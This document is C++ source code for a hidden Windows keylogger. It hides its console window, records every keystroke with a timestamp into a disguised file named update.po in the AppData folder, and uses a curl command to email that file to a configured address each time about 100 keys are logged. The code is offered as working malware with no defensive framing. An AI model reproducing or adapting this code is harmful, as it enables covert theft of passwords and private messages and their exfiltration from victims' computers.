#pragma warning(disable : 4996)
#include <iostream>
#include <fstream>
#include <conio.h>
#include <windows.h>
#include <thread>
#include <vector>

std::vector<std::string> strokesPackage;
char* appdata = getenv("APPDATA");
std::string path = std::string(appdata) + "/update.po"; //Path of the file with strokes

void SendMail()
{
    std::string textToMail = "curl --ssl-reqd --url [SMTP_SERVER] --user [EMAIL]:[PASSWORD] --mail-from [EMAIL] --mail-rcpt [EMAIL_RECEIVER] --upload-file " + path;
    system(textToMail.c_str());
    remove(path.c_str());
}

void Save()
{
    std::ofstream file;
    std::string strokes;

    //Getting time
    time_t now = time(0);
    tm* localtm = localtime(&now);
    tm* gmtm = gmtime(&now);
    std::string date = asctime(gmtm);
    date.pop_back();

    //Text into file
    file.open(path, std::ios::app);
    for (auto stroke : strokesPackage)
    {
        strokes += stroke;
    }
    file << '\n' << '[' << date << "] " << '\n' << strokes << std::endl;
    file.close();

    strokesPackage.clear();
}

bool SpecialKeys(int S_Key) {
    switch (S_Key) 
    {
        case VK_SPACE:
            strokesPackage.push_back("[Space]");
            return true;
        case VK_RETURN:
            strokesPackage.push_back("[Enter]");
            return true;
        case '¾':
            strokesPackage.push_back(".");
            return true;
        case VK_SHIFT:
            strokesPackage.push_back("[Shift]");
            return true;
        case VK_BACK:
            strokesPackage.push_back("[Backspace]");
            return true;
        case VK_CAPITAL:
            strokesPackage.push_back("[CapsLock]");
            return true;
        case VK_TAB:
            strokesPackage.push_back("[TAB]");
            return true;
        case VK_MENU:
            strokesPackage.push_back("[Alt]");
            return true;
        default:
            return false;
    }
}

void Read()
{
    while (true)
    {
        //Save strokes to the file after vector has 100 or more words
        if (strokesPackage.size() >= 100)
        {
            Save();
            SendMail();
        }

        Sleep(10);
        for (int KEY = 8; KEY <= 190; KEY++)
        {
            if (GetAsyncKeyState(KEY) == -32767)
                if (SpecialKeys(KEY) == false)
                {
                    strokesPackage.push_back(std::string(1, static_cast<char>(KEY)));
                    std::cout << KEY << std::endl;
                }
        }
    }
}

//Not working feature (Event isn't called)
//BOOL WINAPI HandlerRoutine(DWORD CEvent)
//{
//    //Save strokes on pc shut down
//    if (CEvent == CTRL_SHUTDOWN_EVENT)
//    {
//        Save();
//        SendMail();
//    }
//    return TRUE;
//}

int main()
{
    //Hide
    ShowWindow(GetConsoleWindow(), SW_HIDE); //SW_RESTORE to show window

    //Set event handler
    //SetConsoleCtrlHandler(HandlerRoutine, TRUE); //Not working feature

    Read();
}
